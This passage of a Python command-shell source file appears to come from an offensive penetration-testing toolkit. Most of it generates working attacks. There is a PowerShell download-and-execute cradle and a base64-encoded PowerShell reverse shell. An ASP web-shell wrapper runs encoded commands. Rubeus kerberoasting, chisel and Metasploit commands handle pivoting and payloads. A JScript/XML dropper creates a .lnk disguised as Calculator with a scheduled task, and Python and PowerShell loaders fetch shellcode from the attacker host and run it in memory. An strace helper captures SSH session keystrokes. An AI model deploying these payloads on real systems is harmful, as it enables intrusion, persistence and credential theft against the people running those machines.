            - The command downloads and executes a `.ps1` script from `lhost` using `New-Object WebClient`.

        4. Encodes the PowerShell command:
            - Converts the command to UTF-16LE encoding.
            - Encodes the UTF-16LE encoded command to base64.
            - Copies the final base64 command to the clipboard using `xclip`.

        :param line: The name of the `.ps1` file located in the `sessions` directory.
        :type line: str
        :returns: None

        Manual execution:
        To manually use the payload:
        - Ensure `lhost` is set to the correct IP address.
        - Place the `.ps1` file in the `sessions` directory.
        - Use `xclip` to copy the generated base64 command to the clipboard.

        Note: Ensure `iconv`, `base64`, and `xclip` are installed and available on your system.
        """

        lhost = self.params["lhost"]
        if not lhost:
            print_error(f"lhost debe estàr seteado. Ej: set lhost 10.10.10.10")
            return
        if not line:
            print_error(
                f"Debes pasarle el nombre del archivo puesto en el directorio sessions ejemplo: {GREEN}winbase64payload payload.ps1"
            )
            return

        os.system(
            f"printf -n\"IEX(New-Object New.WebClient).downloadString('http://{lhost}/{line}')\"  iconv -t utf-16le | base64 -w 0 | xclip -sel clip"
        )
        print_msg(
            f"Try... printf -n\"IEX(New-Object New.WebClient).downloadString('http://{lhost}/{line}')\" | iconv -t utf-16le | base64"
        )
        print_msg("copied to clipboard")
        return

    def do_revwin(self, line):
        """
        Creates a base64 encoded PowerShell reverse shell payload specifically for Windows to execute a `.ps1` script from `lhost`.

        1. Checks if `lhost` and `lport` are set and valid:
            - Uses `check_lhost(lhost)` to verify the `lhost` parameter.
            - Uses `check_lport(lport)` to verify the `lport` parameter.
            - Exits the function if either `lhost` or `lport` is invalid.

        2. Constructs a PowerShell reverse shell command with the following structure:
            - Connects to the specified `lhost` and `lport` using `TCPClient`.
            - Reads data from the TCP stream, executes it, and sends back the results.
            - Appends the current path to the response for interactive use.

        3. Encodes the PowerShell command:
            - Encodes the command in UTF-16LE.
            - Converts the UTF-16LE encoded command to base64.
            - Creates a PowerShell command that executes the base64 encoded payload.

        4. Copies the final PowerShell command to the clipboard:
            - Uses `xclip` to copy the command to the clipboard.

        :param line: This parameter is not used in the function but is present for consistency with the method signature.
        :type line: str
        :returns: None

        Manual execution:
        To manually use the payload:
        - Ensure `lhost` and `lport` are correctly set.
        - Use `xclip` to copy the generated PowerShell command to the clipboard.

        Note: Ensure `xclip` is installed and available on your system.
        """


        lhost = self.params["lhost"]
        lport = self.params["lport"]
        if not check_lhost(lhost):
            return
        if not check_lport(lport):
            return

        cmd = """$client = New-Object System.Net.Sockets.TCPClient("{lhost}",{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()""".replace(
            "{lhost}", lhost
        ).replace("{lport}", str(lport))
        # Codifica el comando en UTF-16LE
        utf16le_encoded = cmd.encode("utf-16le")
        # Codifica el resultado en base64
        base64_encoded = base64.b64encode(utf16le_encoded)
        # Convierte el resultado a una cadena y elimina el salto de línea final
        base64_string = base64_encoded.decode("utf-8").strip()
        cmdd = f"""powershell -e {base64_string}"""
        os.system(f'printf "{cmdd}" | xclip -sel clip')
        print_msg(f'printf "{cmdd}" | xclip -sel clip')

        return

    def do_asprevbase64(self, line):
        """
        Creates a base64 encoded ASP reverse shell payload and copies it to the clipboard.

        1. Checks if a base64 encoded payload is provided:
            - If no payload is provided, displays an error message and exits the function.

        2. If a payload is provided:
            - Creates an ASP script that uses `WScript.Shell` to execute a PowerShell command encoded in base64.
            - The created ASP script writes the result of the PowerShell command to the response output.
            - Uses `xclip` to copy the ASP script to the clipboard with the provided base64 encoded payload.

        :param line: The base64 encoded payload to be used in the ASP reverse shell.
        :type line: str
        :returns: None

        Manual execution:
        To manually create the ASP payload:
        - Ensure you have the base64 encoded payload ready.
        - Use `xclip` to copy the provided command to the clipboard.

        Note: Ensure `xclip` is installed and available on your system. For help on creating the base64 encoded payload, see `help winbase64payload`.
        """

        if not line:
            print_error(
                f"you need pass the payload in base64 as argument Ex: {GREEN}asprevbase64 LW5JRVgoTmV3LU9iamVjdCBOZXcuV2ViQ2xpZW50KS5kb3dubG9hZFN0cmluZygnaHR0cDovLzEwLjEwLjE0LjI0MS9wcy5wczEnKSBpY29udiAtdCB1dGYtMTZsZQo="
            )
            return
        os.system(
            f'echo -n \'<%response.write CreateObject("WScript.Shell").Exec("cmd /c powershell -encodedcommand {line}").StdOut.Readall()%>\' | xclip -sel clip'
        )
        print_msg(
            f'Try... echo -n \'<%response.write CreateObject("WScript.Shell").Exec("cmd /c powershell -encodedcommand {line}").StdOut.Readall()%>\' | xclip -sel clip'
        )
        return

    def do_rubeus(self, line):
        """
        Copies a command to the clipboard for downloading and running Rubeus.

        1. Checks if `lhost` (local host IP) is set:
            - If `lhost` is not set, displays an error message and exits the function.

        2. If `lhost` is set:
            - Displays a message indicating that the Rubeus downloader command has been copied to the clipboard.
            - The copied command downloads Rubeus from the specified `lhost` and saves it as `Rubeus.exe`.
            - Uses `xclip` to copy the following command to the clipboard:
            - `iwr -uri http://{lhost}/Rubeus.exe -OutFile Rubeus.exe ; .\\Rubeus.exe kerberoast /creduser:domain.local\\usuario /credpassword:password`

        :param line: Not used in this function.
        :type line: str
        :returns: None

        Manual execution:
        To manually run these tasks, you would need to:
        - Ensure that `lhost` is set correctly.
        - Use `xclip` to copy the provided command to the clipboard.
        - Execute the downloaded Rubeus executable with the provided arguments.

        Note: Ensure `xclip` is installed and available on your system.
        """

        lhost = self.params["lhost"]
        if not lhost:
            print_error(f"lhost must be set use set lhost <ip>{RESET}")
            return

        print_msg(
            f"{YELLOW}Rubeus downloader (echo 'iwr -uri http://{lhost}/Rubeus.exe -OutFile Rubeus.exe' | xclip -sel clip) copied to clipboard. {RESET}"
        )
        os.system(
            f"echo 'iwr -uri http://{lhost}/Rubeus.exe -OutFile Rubeus.exe ; .\\Rubeus.exe kerberoast /creduser:domain.local\\usuario /credpassword:password' | xclip -sel clip"
        )
        return

    def do_socat(self, line):
        """
        Sets up and runs a `socat` tunnel with SOCKS4A proxy support.

        1. If no `line` (IP:port) argument is provided:
            - Displays an error message indicating the need to pass `ip:port`.
            - Exits the function.

        2. Displays a message instructing the user to configure `socks5` at `127.0.0.1:1080` in `/etc/proxychains.conf`.

        3. If a valid `line` argument is provided:
            - Displays the command being run: `socat TCP-LISTEN:1080,fork SOCKS4A:localhost:{line},socksport=1080`.
            - Executes the `socat` command to listen on port 1080 and forward traffic to the specified IP and port using SOCKS4A proxy.
            - Prints a shutdown message for the `socat` tunnel at port 1080.

        :param line: The IP and port (formatted as `ip:port`) to forward traffic to through the SOCKS4A proxy.
        :type line: str
        :returns: None

        Manual execution:
        To manually run these tasks, you would need to:
        - Configure the `socks5` proxy settings in `/etc/proxychains.conf`.
        - Use the `socat` command with appropriate IP and port.

        Note: Ensure that `socat` is installed and properly configured on your system.
        """

        print_msg(
            f"You must seted {GREEN}socks5 127.0.0.1 1080 {YELLOW}at {GREEN}/etc/proxychains.conf{RESET}"
        )
        if not line:
            print_error(
                f"You must pass ip:port by argument ex:{GREEN} socat 10.10.10:445  {WHITE} more help: {CYAN} help socat{RESET} "
            )
            return
        print_msg(
            f"Try... {MAGENTA}socat TCP-LISTEN:1080,fork SOCKS4A:localhost:{line},socksport=1080{RESET}"
        )
        os.system(f"socat TCP-LISTEN:1080,fork SOCKS4A:localhost:{line},socksport=1080")
        print_msg(
            f"{YELLOW} Shutdown socat tunnel at sessions in port {RED} 1080 {RESET}"
        )
        return

    def do_chisel(self, line):
        """
        Automates the setup and execution of Chisel server and client for tunneling and port forwarding.

        1. If no `lhost` (local host IP) is set:
            - Displays an error message indicating the need to set `lhost` using the `set` command.
            - Exits the function.

        2. If no port argument is provided:
            - Displays an error message indicating the need to provide a port number.
            - Exits the function.

        3. If required Chisel files are not present:
            - Displays an error message prompting the user to run the `download_resources` command.
            - Exits the function.

        4. If a valid port is provided:
            - Displays usage instructions for the Linux and Windows payloads.
            - Constructs and copies the appropriate Chisel command to the clipboard based on user choice (1 for Windows, 2 for Linux).
            - Extracts and sets up Chisel binaries for Linux and Windows from compressed files.
            - Runs the Chisel server on the specified port and prints a shutdown message.

        :param line: The command line input containing the port number for Chisel setup.
        :type line: str
        :returns: None

        Manual execution:
        To manually run these tasks, you would need to:
        - Ensure `lhost` is set using `set lhost <IP>`.
        - Provide the port number when calling the function.
        - Run the command `download_resources` if the Chisel files are missing.
        - Manually execute the Chisel commands for Linux or Windows as copied to the clipboard.

        Note: Ensure that all required files (`chisel_1.9.1_linux_amd64.gz` and `chisel_1.9.1_windows_amd64.gz`) are available in the `sessions` directory.
        """

        lhost = self.params["lhost"]
        if not lhost:
            print_error(
                f"You must set lhost ex:{GREEN} set lhost 10.10.10.10 or payload (alias p)  {WHITE} more help: {CYAN} help set{RESET} "
            )
            return
        if not line:
            print_error(
                f"You must pass the port by argument ex:{GREEN} chisel 3333 {WHITE} more help: {CYAN} help chisel{RESET} "
            )
            return
        if not os.path.exists(
            "sessions/chisel_1.9.1_linux_amd64.gz"
        ) or not os.path.exists("./sessions/chisel_1.9.1_windows_amd64.gz"):
            print_error(
                f"You must run the command {GREEN}download_resources{YELLOW} before run {GREEN}chisel {YELLOW}mode server {GREEN}at port {line}{RESET}"
            )
            return

        args = line.split(" ")

        if len(args) == 1:
            lport = args[0]
            print_msg(
                f"Running {YELLOW}./sessions/chisel_1.9.1_linux_amd64 server -p {lport} --reverse -v {RESET} and copied .\pivot.exe client -v {lhost}:{lport} R:127.0.0.1:socks  to clipboard :D"
            )
            command = f"""iwr -uri http://{lhost}/chisel.exe -OutFile pivot.exe ;"""
            command += " .\\"
            command += f"""pivot.exe client -v {lhost}:{lport} R:127.0.0.1:socks"""
            command1 = f"echo '{command}' | xclip -sel clip"

            command = f"""curl http://{lhost}/chisel_1.9.1_linux_amd64 -o chisel ; chmod +x chisel ; """
            command += " ./"
            command += f"""chisel client -v {lhost}:{lport} R:127.0.0.1:socks"""
            command2 = f"echo '{command}' | xclip -sel clip"

            print_warn("<modo de uso>")
            print_msg(f"{command1=}")
            print_msg(f"{command2=}")
            print_warn("</modo de uso>")

            choice = input(
                f"    {CYAN}[?] {MAGENTA}Which payload would you like to copy to the clipboard? (1 or 2): {RESET}"
            ).strip()

            if choice == "1":
                os.system(command1)
                print_msg(f"Payload 1 copied to Clipboard")
            elif choice == "2":
                os.system(command2)
                print_msg(f"Payload 2 copied to Clipboard")

            else:
                print_error("Invalid choice. Please select 1 or 2")
                return

            os.system(
                f"cd sessions && gunzip -c chisel_1.9.1_linux_amd64.gz > chisel_1.9.1_linux_amd64 && gunzip -c chisel_1.9.1_windows_amd64.gz > chisel.exe  && chmod +x chisel* && upx chisel.exe && upx chisel_1.9.1_linux_amd64 && ./chisel_1.9.1_linux_amd64 server --reverse -p {lport} --socks5 -v"
            )
            print_msg(
                f"Shutdown chisel tunnel at sessions in port {RED} {line} {RESET}"
            )

        else:
            print_error(
                f"you must pass the port by argument ex:{GREEN} chisel 3333 {WHITE} more help: {CYAN} help chisel{RESET} "
            )
        return

    def do_msf(self, line):
        """
        Automates various Metasploit tasks including scanning for vulnerabilities, setting up reverse shells, and creating payloads.

        1. If no arguments are provided:
            - Retrieves the target IP (`rhost`) from parameters.
            - Checks if the IP is valid using `check_rhost()`. If invalid, exits the function.
            - Creates a Metasploit resource script (`/tmp/scan_vulnerabilities.rc`) that includes commands for scanning ports, enumerating services, and checking for known vulnerabilities.
            - Executes Metasploit with the created resource script and then deletes the temporary file.
            - Prints a shutdown message after running the scan.

        2. If the argument starts with "rev":
            - Sets up a reverse shell payload based on the specified platform and user choice (with or without meterpreter).
            - Creates a Metasploit resource script (`/tmp/handler.rc`) for handling incoming reverse shell connections.
            - Executes Metasploit with the created resource script and then deletes the temporary file.
            - Prints a shutdown message after setting up the handler.

        3. If the argument starts with "lnk":
            - Configures parameters (`lhost`, `lport`) for creating a payload.
            - Uses `msfvenom` to generate a payload executable and saves it in the `sessions` directory.
            - Creates an XML file (`download_payload.xml`) that will be used to download and execute the payload on a target machine.
            - Creates a PowerShell script (`create_lnk.ps1`) to generate a shortcut file (`.lnk`) pointing to the payload.
            - Prints instructions and generates a command to copy to the clipboard for setting up the payload and files.

        4. If the argument starts with "autoroute":
            - Configures parameters for setting up a Metasploit session and autorouting.
            - Creates a Metasploit resource script (`/tmp/autoroute.rc`) to handle exploit sessions and set up autorouting.
            - Executes Metasploit with the resource script and starts a SOCKS proxy for routing traffic.
            - Configures proxychains to use the Metasploit SOCKS proxy and prints instructions for using proxychains with tools.

        :param line: The command line input that determines which Metasploit task to automate.
        :type line: str
        :returns: None

        Manual execution:
        To manually run these tasks, you would need to:
        - For scanning: Create and run the resource script using `msfconsole -r /tmp/scan_vulnerabilities.rc`.
        - For reverse shells: Configure and run the resource script with the appropriate payload settings.
        - For payload generation and shortcuts: Use `msfvenom` and create XML and PowerShell scripts as specified.
        - For autorouting: Create and run the resource script for autorouting and configure proxychains.

        Note: Ensure all required parameters (`lhost`, `lport`, etc.) are set before running these tasks.
        """

        if not line:
            rhost = self.params["rhost"]
            if not check_rhost(rhost):
                return
            TARGET_IP = rhost
            rc_file_path = "/tmp/scan_vulnerabilities.rc"
            
            with open(rc_file_path, "w") as file:
                file.write(f"""
            # Configurar la IP del objetivo
            setg RHOSTS {TARGET_IP}

            # Escanear puertos abiertos
            use auxiliary/scanner/portscan/tcp
            set THREADS 10
            run

            # Enumerar servicios y versiones
            use auxiliary/scanner/portscan/tcp
            set PORTS 1-65535
            run

            # Buscar vulnerabilidades conocidas
            use auxiliary/scanner/vuln/ms17_010_eternalblue
            set RHOSTS {TARGET_IP}
            run

            # Probar exploits y enumerar vulnerabilidades
            use auxiliary/scanner/ftp/anonymous
            set RHOSTS {TARGET_IP}
            run

            # Buscar módulos de explotación de vulnerabilidades
            search ms17_010

            # Terminar la sesión
            exit
            """)

            
            subprocess.run(["msfconsole", "-r", rc_file_path], check=True)

            if os.path.exists(rc_file_path):
                os.remove(rc_file_path)
                
            print_msg(f"{YELLOW}Shutdown msfconsole scan {RED} [;,;] {RESET}")
            return
        elif line.startswith("rev"):
            """Automate msfconsole exploit setup"""
            args = line.split(" ")

            if len(args) == 1:
                setpayload = "windows/meterpreter/reverse_tcp"
            elif len(args) == 2:
                if args[1] in ["win", "win64", "lin", "lin64", "mac", "mac64", "android"]:
                    print_msg("Select payload type:")
                    print_msg("1: With meterpreter")
                    print_msg("2: Without meterpreter")
                    choice = input("Enter your choice (1 or 2): ").strip()

                    if args[1] == "win":
                        if choice == "1":
                            setpayload = "windows/meterpreter/reverse_tcp"
                        elif choice == "2":
                            setpayload = "windows/shell_reverse_tcp"
                        else:
                            print_error("Invalid choice")
                            return
                    elif args[1] == "win64":
                        if choice == "1":
                            setpayload = "windows/x64/meterpreter/reverse_tcp"
                        elif choice == "2":
                            setpayload = "windows/x64/shell_reverse_tcp"
                        else:
                            print_error("Invalid choice")
                            return
                    elif args[1] == "lin":
                        if choice == "1":
                            setpayload = "linux/x86/meterpreter/reverse_tcp"
                        elif choice == "2":
                            setpayload = "linux/x86/shell_reverse_tcp"
                        else:
                            print_error("Invalid choice")
                            return
                    elif args[1] == "lin64":
                        if choice == "1":
                            setpayload = "linux/x64/meterpreter/reverse_tcp"
                        elif choice == "2":
                            setpayload = "linux/x64/shell_reverse_tcp"
                        else:
                            print_error("Invalid choice")
                            return
                    elif args[1] == "mac":
                        if choice == "1":
                            setpayload = "osx/x86/meterpreter/reverse_tcp"
                        elif choice == "2":
                            setpayload = "osx/x86/shell_reverse_tcp"
                        else:
                            print_error("Invalid choice")
                            return
                    elif args[1] == "mac64":
                        if choice == "1":
                            setpayload = "osx/x64/meterpreter/reverse_tcp"
                        elif choice == "2":
                            setpayload = "osx/x64/shell_reverse_tcp"
                        else:
                            print_error("Invalid choice")
                            return
                    elif args[1] == "android":
                        if choice == "1":
                            setpayload = "android/meterpreter/reverse_tcp"
                        elif choice == "2":
                            setpayload = "android/shell_reverse_tcp"
                        else:
                            print_error("Invalid choice")
                            return
                    print_msg(f"Selected payload: {setpayload}")

                    
                else:
                    print_error("Invalid platform specified")

            lhost = self.params["lhost"]
            lport = self.params["lport"]
            if not lhost or not lport:
                print_error(f"lhost or lport must be set use set lhost <ip>{RESET}")
                return
            lhost = f"{lhost}"
            lport = f"{lport}"

            rc_file_path = "/tmp/handler.rc"

            with open(rc_file_path, "w") as file:
                file.write(f"""
                use exploit/multi/handler
                set payload {setpayload}
                set LHOST {lhost}
                set LPORT {lport}
                run
                """)

            subprocess.run(["msfconsole", "-r", rc_file_path], check=True)
            if os.path.exists(rc_file_path):
                os.remove(rc_file_path)
            print_msg(f"{YELLOW}Shutdown rev meterpreter sessions {RED} [;,;] {RESET}")
            return

        elif line.startswith("lnk"):
            lhost = self.params["lhost"]
            lport = self.params["lport"]
            if not lhost or not lport:
                print_error(f"lhost or lport must be set use set lhost <ip>{RESET}")
                return

            lhost = f"{lhost}"
            lport = f"{lport}"

            web_root = "sessions"
            payload = "C:\\xampp\\htdocs\\payload.exe" 
            args = line.split(" ")
            if not lhost or not lport:
                print_error(
                    "lhost o lport deben estar establecidos. Usa 'set lhost <ip>'"
                )
            else:
                if len(args) == 1:
                    setpayload = "windows/meterpreter/reverse_tcp"
                elif len(args) == 2:
                    if args[1] == "win":
                        setpayload = "windows/meterpreter/reverse_tcp"
                    if args[1] == "win64":
                        setpayload = "windows/x64/meterpreter/reverse_tcp"

                payload_path = os.path.join(web_root, "payload.exe")
                msfvenom_cmd = f"msfvenom -p {setpayload} LHOST={lhost} LPORT={lport} -f exe -o {payload_path}"
                subprocess.run(msfvenom_cmd, shell=True, check=True)
                print_msg("Payload creado con éxito en: " + payload_path)

                xml_content = f"""<?xml version="1.0"?>
                <job>
                <script language="JScript">
                    var objShell = new ActiveXObject("WScript.Shell");
                    var objExec = objShell.Exec("cmd.exe /c powershell -Command \\"Invoke-WebRequest -Uri 'http://{lhost}/payload.exe' -OutFile 'C:\\Windows\\Temp\\payload.exe'; Start-Process 'C:\\Windows\\Temp\\payload.exe'\\"");
                </script>
                </job>
                """
                xml_path = os.path.join(web_root, "download_payload.xml")
                with open(xml_path, "w") as xml_file:
                    xml_file.write(xml_content)
                print_msg("Archivo XML creado con éxito en " + xml_path)
                print_msg(f"Asegúrate de que el payload esté en: {payload}")
                ps_script_content = f"""
                $WshShell = New-Object -ComObject WScript.Shell
                $Shortcut = $WshShell.CreateShortcut("c:\Common Applications\Calculator.lnk")
                $Shortcut.TargetPath = "{payload}"
                $Shortcut.Save()
                """.replace("                ", "")
                ps_script_path = os.path.join("sessions", "create_lnk.ps1")
                with open(ps_script_path, "w") as ps_script_file:
                    ps_script_file.write(ps_script_content)

                print_msg(f"Script de PowerShell creado en {ps_script_path}")
                print_msg(
                    "Ejecuta este script en la máquina Windows para crear el archivo .lnk contenido:"
                )
                print(ps_script_content)
   
                cmd = f"""echo 'powershell -Command \\"Invoke-WebRequest -Uri \'http://{lhost}/create_lnk.ps1\' -OutFile \'C:\\Windows\\Temp\\create_lnk.ps1\'; schtasks /create /tn \'DownloadPayload\' /ps1 \'C:\\Windows\\Temp\\create_lnk.ps1\' /f; schtasks /run /tn \'DownloadPayload\' ; powershell -ExecutionPolicy Bypass -File create_lnk.ps1' | xclip -sel clip"""
                print_msg(
                    f"El payload y los archivos necesarios han sido generados exitosamente. el comando {cmd} se copio en la clipboard, ejecute www para diponer los archivos mediante un servidor web"
                )
                os.system(cmd)
                return

        elif line.startswith("autoroute"):
            args = line.split(" ")
            lhost = self.params["lhost"]
            lport = self.params["lport"]
            if not lhost or not lport:
                print_error(f"lhost or lport must be set use set lhost <ip>{RESET}")
                return
            if len(args) == 1:
                setpayload = "windows/meterpreter/reverse_tcp"
            elif len(args) == 2:
                if args[1] == "win":
                    setpayload = "windows/meterpreter/reverse_tcp"
                if args[1] == "win64":
                    setpayload = "windows/x64/meterpreter/reverse_tcp"
                elif args[1] == "lin":
                    setpayload = "linux/x86/meterpreter/reverse_tcp"
                elif args[1] == "lin64":
                    setpayload = "linux/x64/meterpreter/reverse_tcp"
                elif args[1] == "mac":
                    setpayload = "osx/x86/shell_reverse_tcp"
                elif args[1] == "mac64":
                    setpayload = "osx/x64/meterpreter/reverse_tcp"

            session_id = (
                "1"  
            )
            target_subnet = "192.168.100.0" 
            netmask = "255.255.255.0"  
            rc_file_path = "/tmp/autoroute.rc"

            with open(rc_file_path, "w") as file:
                file.write(f"""
            use exploit/multi/handler
            set payload {setpayload}
            set LHOST {lhost}
            set LPORT {lport}
            exploit -j -z

            # After getting a session
            sessions -i {session_id}
            run post/multi/manage/autoroute RHOST={target_subnet} NETMASK={netmask}

            # Exit the Metasploit console
            exit
            """)
            subprocess.run(["msfconsole", "-r", rc_file_path], check=True)
            subprocess.run(
                [
                    "msfconsole",
                    "-q",
                    "-x",
                    "use auxiliary/server/socks_proxy; set SRVHOST 127.0.0.1; set SRVPORT 1080; run -j",
                ],
                check=True,
            )
            # proxychains_conf_path = '/etc/proxychains.conf'
            # with open(proxychains_conf_path, 'a') as file:
            #    file.write("\nsocks4 127.0.0.1 1080")
            print_msg(
                "Proxychains is configured to use the Metasploit SOCKS proxy on 127.0.0.1:1080"
            )
            print_msg(
                "You can now use proxychains with your tools, e.g., proxychains nmap -sT -Pn <target_ip>"
            )

            # Cleanup
            if os.path.exists(rc_file_path):
                os.remove(rc_file_path)

    def do_encrypt(self, line):
        """
        Encrypts a file using XOR encryption.

        1. Splits the provided `line` into `file_path` and `key` arguments.
        2. Checks if the correct number of arguments (2) is provided; if not, prints an error message and returns.
        3. Reads the file specified by `file_path`.
        4. Encrypts the file contents using the `xor_encrypt_decrypt` function with the provided `key`.
        5. Writes the encrypted data to a new file with the ".enc" extension added to the original file name.
        6. Prints a message indicating the file has been encrypted.
        7. Catches and handles the `FileNotFoundError` exception if the specified file does not exist, and prints an error message.

        :param line: A string containing the file path and the key separated by a space.
        :type line: str
        :returns: None

        Manual execution:
        To manually run this command, use the following syntax:
            encrypt <file_path> <key>
        Replace `<file_path>` with the path to the file to be encrypted and `<key>` with the encryption key.
        """

        args = shlex.split(line)
        if len(args) != 2:
            print_error("Usage: encrypt <file_path> <key>")
            return

        file_path, key = args

        try:
            with open(file_path, "rb") as f:
                data = f.read()

            encrypted_data = xor_encrypt_decrypt(data, key)
            with open(file_path + ".enc", "wb") as f:
                f.write(encrypted_data)
            print_msg(f"File encrypted: {file_path}.enc")
        except FileNotFoundError:
            print_error(f"File not found: {file_path}")

    def do_decrypt(self, line):
        """
        Decrypts a file using XOR encryption.

        1. Splits the provided `line` into `file_path` and `key` arguments.
        2. Checks if the correct number of arguments (2) is provided; if not, prints an error message and returns.
        3. Reads the encrypted file specified by `file_path`.
        4. Decrypts the file contents using the `xor_encrypt_decrypt` function with the provided `key`.
        5. Writes the decrypted data to a new file by removing the ".enc" extension from the original file name.
        6. Prints a message indicating the file has been decrypted.
        7. Catches and handles the `FileNotFoundError` exception if the specified file does not exist, and prints an error message.

        :param line: A string containing the file path and the key separated by a space.
        :type line: str
        :returns: None

        Manual execution:
        To manually run this command, use the following syntax:
            decrypt <file_path> <key>
        Replace `<file_path>` with the path to the encrypted file and `<key>` with the decryption key.
        """

        args = shlex.split(line)
        if len(args) != 2:
            print_error("Usage: decrypt <file_path> <key>")
            return

        file_path, key = args

        try:
            with open(file_path, "rb") as f:
                data = f.read()

            decrypted_data = xor_encrypt_decrypt(data, key)
            with open(file_path.replace(".enc", ""), "wb") as f:
                f.write(decrypted_data)
            print_msg(f"File decrypted: {file_path.replace('.enc', '')}")
        except FileNotFoundError:
            print_error(f"File not found: {file_path}")

    def get_output(self):
        """Devuelve la salida acumulada"""
        return self.output

    def do_sessionssh(self, line):
        """
        Ejecuta un comando para listar las conexiones SSH activas.

        Este método utiliza `netstat` para mostrar las conexiones establecidas (`ESTAB`) y filtra los resultados para mostrar solo las conexiones SSH. 

        Parámetros:
        - line: Parámetro no utilizado en esta función.

        Returns:
        - None

        Ejemplos:
        >>> do_sessionssh("")
        (Muestra en consola las conexiones SSH activas)
        """

        command = "netstat -putan |grep -i estab| grep ssh"
        print_msg("Lanzando netstat en busqueda de sessions ssh activas")
        copy2clip(command)
        os.system(command)
        return

    def do_sessionsshstrace(self, line):
        """
        Attach strace to a running process and log output to a file.

        This function attaches `strace` to a process specified by its PID,
        tracing system calls related to writing data. The output of `strace`
        is saved to a file named `strace.txt` in the `sessions` directory.

        Parameters:
        - line (str): The PID of the process to attach strace to.

        Raises:
        - ValueError: If the `line` parameter is empty.
        - FileNotFoundError: If `strace` is not installed.

        Example:
        - `sessionsshstrace 666`: Attach strace to process with PID 666.

        Notes:
        - Ensure the `sessions` directory exists or is created before running the command.
        - The command redirects both stdout and stderr to the `strace.txt` file.
        """        
        if not line:
            print_error("You must pass the PID of the process to attach strace, e.g., sessionsshstrace 666")
            return
        if not is_binary_present("strace"):
            print_error(f"strace must be installed. Use: {GREEN} apt install strace -y")
            return
        command = f"strace -ff -e trace=write -e write=1,2 -p {line} > sessions/strace.txt 2>&1"
        copy2clip(command)
        print_msg("Launching strace...")
        try:
            subprocess.run(command, shell=True, check=True)
        except subprocess.CalledProcessError as e:
            print_error(f"Command failed with return code {e.returncode}.")
        except KeyboardInterrupt:
            print_warn("strace was interrupted by user.")
        except Exception as e:
            print_error(f"An unexpected error occurred: {e}")

        path = os.getcwd()
        file = f"{path}/sessions/strace.txt" 

        print_msg("\nSalida de comandos\n")
        salida_strace(file)
        print_msg("\nEntrada del usuario\n")
        teclado_usuario(file)
        print_warn("Stopped strace...")
        return

    def do_lazyscript(self, line):
        """
        Executes commands defined in a lazyscript file.

        This function reads a script file containing commands to be executed
        sequentially. Each command is executed using the onecmd method of the 
        cmd.Cmd class. The script file should be located in the 'lazyscripts' 
        directory relative to the current working directory.

        Args:
            line (str): The name of the script file to execute (e.g., 'lazyscript.ls').

        Example:
            do_lazyscript('example_script.ls')
            This would execute all commands listed in 'lazyscripts/example_script.ls'.

        """
        script_path = os.path.join(os.getcwd(), 'lazyscripts', line)
        
        if not os.path.isfile(script_path):
            print_error(f"Script file not found: {script_path}")
            return
        with open(script_path, 'r') as file:
            commands = file.readlines()
        
        for command in commands:
            command = command.strip()
            if command:
                print_msg(f"Executing command: {command}")
                self.onecmd(command)

    def do_set_proxychains(self, line):
        """
        Relanza la aplicación actual utilizando `proxychains` para enrutar el tráfico
        a través de los proxies configurados.

        Este comando reinicia la aplicación desde el principio utilizando un script
        bash externo llamado `run`, que se encarga de configurar el entorno 
        (como activar un entorno virtual) y luego ejecutar la aplicación Python. 
        El comando `proxychains` se utiliza para asegurar que cualquier comando 
        ejecutado dentro de la aplicación, como `nmap`, sea encaminado a través 
        de los proxies especificados en la configuración de `proxychains`.

        Pasos realizados por esta función:
        1. Obtiene la ruta al script `run`.
        2. Relanza el script `run` bajo `proxychains` utilizando `subprocess.run`.
        3. Sale de la instancia actual de la aplicación para evitar duplicación.

        Args:
            line (str): No se utiliza en este comando, pero se incluye como parte 
                        de la interfaz estándar de `cmd`.
        """
        print_msg("Restarting with proxychains...")
        run_script_path = "run"
        subprocess.run(["proxychains", "bash", run_script_path] + sys.argv[1:])
        sys.exit()

    def do_shellcode(self, line):
        """
        Generates a Python one-liner to execute shellcode from a given URL.
        
        This function:
        1. Retrieves the local host (lhost) from the parameters.
        2. Checks if the local host is valid.
        3. Verifies the existence of the `shellcode.bin` file in the expected directory.
        4. Constructs a Python one-liner command that:
            - Fetches the shellcode from the specified URL.
            - Decodes the base64-encoded shellcode.
            - Creates a buffer in memory for the shellcode.
            - Casts the buffer to a function pointer.
            - Executes the shellcode.
        5. Copies the generated command to the clipboard for easy execution.
        """

        lhost = self.params['lhost']
        if not check_lhost(lhost):
            return
        path = os.getcwd()
        if not os.path.exists(f"{path}/sessions/shellcode.bin"):
            print_error(f"shellcode.bin must exist, you need {GREEN}run lazymsfvenom {RED}or {GREEN}venom {RED}before {GREEN}shellcode {RED}command")
            return
        command = f'python3 -c "import base64, ctypes, urllib.request; url = \'http://{lhost}/shellcode.bin\'; response = urllib.request.urlopen(url); shellcode = base64.b64decode(response.read()); shellcode_buffer = ctypes.create_string_buffer(shellcode, len(shellcode)); shellcode_func = ctypes.cast(shellcode_buffer, ctypes.CFUNCTYPE(ctypes.c_void_p)); shellcode_func()"'
        command1 = f'powershell -Command "$url=\'http://{lhost}/shellcode.bin\'; $shellcodeBase64=(Invoke-RestMethod -Uri $url -Method Get); $shellcode=[System.Convert]::FromBase64String($shellcodeBase64); $shellcodeBuffer=[System.Runtime.InteropServices.Marshal]::AllocHGlobal($shellcode.Length); [System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $shellcodeBuffer, $shellcode.Length); $functionDelegate=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($shellcodeBuffer, [System.Action]); $functionDelegate.Invoke(); [System.Runtime.InteropServices.Marshal]::FreeHGlobal($shellcodeBuffer)"'
        print_msg(f"\n{RED}    1 ) {WHITE}" + command) 
        print_msg(f"\n{RED}    2 ) {WHITE}" + command1)
        choice = input("\nChoice option 1 or 2: ")
        if choice == "1":
            copy2clip(command)
        else:
            copy2clip(command1)
        return

    def do_skipfish(self, line):
        """
        This function executes the web security scanning tool Skipfish 
        using the provided configuration and parameters. It allows 
        scanning a specified target (rhost) and saves the results 
        in a designated output directory.

        Parameters:
        - self: Refers to the instance of the class in which this function is defined.
